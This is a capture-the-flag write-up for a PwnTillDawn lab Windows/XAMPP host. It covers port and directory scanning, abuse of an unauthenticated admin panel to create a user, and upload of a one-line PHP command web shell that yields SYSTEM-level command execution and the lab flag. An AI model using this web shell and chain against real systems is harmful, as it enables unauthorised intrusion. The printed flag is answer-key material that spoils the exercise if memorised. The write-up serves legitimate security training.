# 🛡️ PwnTillDawn Write-up — Target 10.150.150.11

> 🎯 First Blood — Full System Compromise + Flag Captured

---

## 📌 Target Information
| Item        | Details                |
|------------|----------------------|
| IP Address | 10.150.150.11        |
| OS         | Windows (XAMPP)      |
| Difficulty | Beginner / Intermediate |

---

## 🧰 Tools Used
- Nmap
- Gobuster
- Browser (Manual Enumeration)
- PHP Web Shell
- Kali Linux

---
---

## Steps Taken

### 1. Recon
- Ran Nmap:

```bash
nmap -sV -sC 10.150.150.11
```

- Open ports found:
  - 21/tcp FTP (Xlight FTPd 3.9)
  - 80/tcp HTTP (Apache 2.4.46, PHP 7.4.9)
  - 135/tcp MSRPC
  - 139/tcp NetBIOS
  - 443/tcp HTTPS
  - 445/tcp Microsoft-DS
  - 1433/tcp MS SQL Server 2012


- Gobuster:

```bash
gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
```
- Found `/admin` and `/upload` directories

---

### 2. Admin Panel Access
- `/admin` allowed directory listing without authentication
- Files of interest:
  - `addedituser.php` – add/edit user
  - `manageusers.php` – manage users
- Added user:

```bash
username: hacker
password: 1234
```

- Logged in → full dashboard access
  - Create folders, upload files
  - Manage users (edit, delete, create)

---

### 3. File Upload & Initial Shell
- Uploaded `test.txt` → confirmed visible & accessible
- Created `shell.php` with content:
```bash
php
<?php phpinfo(); ?>
```

Uploaded to dashboard
Accessed via myfiles.php:
```bash
http://10.150.150.11/download.php?mode=view_file_content&filename=upload/11/shell.php
```

- Confirmed PHP executed → phpinfo displayed

  ---

### 4. Remote Code Execution (RCE)
Upgraded shell to:

```bash
<?php system($_GET['cmd']); ?>
```

Test command:

```bash
whoami
```

Output:

```bash
NT AUTHORITY\SYSTEM
```

- Verified full SYSTEM privileges

---

### 5. Flag Capture

Explored users directory:

```bash
dir C:\Users
```

Checked Administrator Desktop:
```bash
dir C:\Users\Administrator\Desktop
```

Found flag file: FLAG1.txt

Read contents:
```bash
type C:\Users\Administrator\Desktop\FLAG1.txt
```

Flag:
```bash
PwnTillDawnAcademyIsAwesome!!!
```
---

### Notes / Lessons Learned

- Broken Access Control: admin panel accessible without authentication
- File upload vulnerability → remote code execution
- Full SYSTEM access achievable on target
- Always check-in/check-out sessions in PwnTillDawn
- Maintain clear documentation for write-ups

